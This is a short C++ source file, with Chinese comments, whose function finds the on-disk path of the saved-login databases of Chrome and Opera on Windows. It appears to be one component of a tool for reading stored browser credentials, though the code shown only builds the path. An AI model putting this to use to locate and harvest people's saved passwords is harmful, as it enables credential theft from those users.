#include "getLoginData.h"

using namespace std;

//用于查找用户信息文件存储的路径，返回值为路径信息或报错信息
string findLoginData(char* name) {
	char* localAppDataPath = (char*)malloc(sizeof(char) * MAX_PATH);
	string LoginDataPath;

	if (name == CHROME) {
		if (localAppDataPath != NULL) {
			if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, 0, NULL, localAppDataPath) != S_OK) return FIND_DATA_FAIL;//获取appData的Local目录
			LoginDataPath = localAppDataPath;
			free(localAppDataPath);
			localAppDataPath = nullptr;

			LoginDataPath += "\\Google\\Chrome\\User Data\\Default\\Login Data";
			return LoginDataPath;
		}
	}
	else if (name == OPERA) {
		if (localAppDataPath != NULL) {
			if (SHGetFolderPathA(NULL, CSIDL_APPDATA, 0, NULL, localAppDataPath) != S_OK) return FIND_DATA_FAIL;//获取appData的Roaming目录
			LoginDataPath = localAppDataPath;
			free(localAppDataPath);
			localAppDataPath = nullptr;

			LoginDataPath += "\\Opera Software\\Opera Stable\\Login Data";
			return LoginDataPath;
		}
	}


	return FIND_DATA_FAIL;
}